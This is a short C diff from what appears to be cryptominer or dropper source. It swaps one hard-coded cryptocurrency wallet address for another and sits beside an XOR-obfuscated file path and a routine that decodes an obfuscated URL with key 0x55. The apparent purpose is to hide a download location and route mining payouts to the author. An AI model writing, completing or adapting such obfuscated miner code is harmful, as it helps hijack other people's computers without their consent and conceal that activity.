@@ -19,7 +19,7 @@ int main() {
     unsigned char obf_path[] = {0x7A,0x20,0x26,0x27,0x7A,0x26,0x2D,0x00};
 
     // Plain text wallet address (replace with actual wallet)
-    char wallet[] = "8BAei31qDSqCRwS1GsQTWjfMjK4VxxThbFckHFoXyRP1BM2keM3bNCY9YBvpGmwuxG4Nec7gqejYGU8E4VNHXYYC7Y2EUJZ";
+    char wallet[] = "88yrgvUpdYx1RNon4zRcSKJbhXoCz4wcmQztNKrKddDkaWPamJiPNksLcCQcUnyMkF3JYzuiYUXNFCm4fVgJY9qB8qeCNTX";
 
     // Dekripsi URL dan path menggunakan key 0x55
     deobfuscate((char*)obf_url, 0x55);
